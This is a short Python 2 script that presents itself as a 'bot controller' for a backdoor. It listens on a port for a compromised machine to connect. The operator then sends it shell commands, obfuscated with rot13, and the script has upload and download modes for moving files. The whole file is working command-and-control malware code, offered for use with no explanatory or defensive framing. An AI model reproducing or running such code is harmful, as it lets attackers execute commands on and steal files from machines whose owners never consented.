#!/usr/bin/env python

import socket
import sys
import argparse

parser=argparse.ArgumentParser()
parser.add_argument('-p','--port',required=True,help='Port to listen on',dest='port')
args=parser.parse_args()

print "Welcome to your bot controller! \nUse the command 'QU1T' to exit the backdoor\n'UPL0AD' command to upload a file\n'DOWNL0AD' command to download a file from the bot\nListening for connection on port " + args.port + "\n"

mysocket=socket.socket()
mysocket.bind(("",int(args.port)))
mysocket.listen(1)

connection,fromaddr = mysocket.accept()
while True:
    try:
        request = connection.recv(10240)
        if "Terminating C0nnection" in request.decode("rot13"):
            print "QU1T command issued, closing."
            mysocket.close()
            sys.exit()
        if "UPCMD" in request.decode("rot13"):
            print "Upload mode, end all commands with '!!EOC!!':\n"
            print "from bot: \n" + str(request.decode("rot13"))
            upcmd = ""
            while not upcmd.endswith("!!EOC!!"):
                upcmd += raw_input("enter upload command: \n")
            connection.send(upcmd[:-7].encode("rot13"))
        else:
            print "from bot: \n" + str(request.decode("rot13"))
            command = raw_input("enter command: \n")
            if command:
                connection.send(command.encode("rot13"))
            if not command:
                print "you entered nothing, sending whoami command"
                connection.send("whoami".encode("rot13"))
    except Exception, e:
        print str(e)
        continue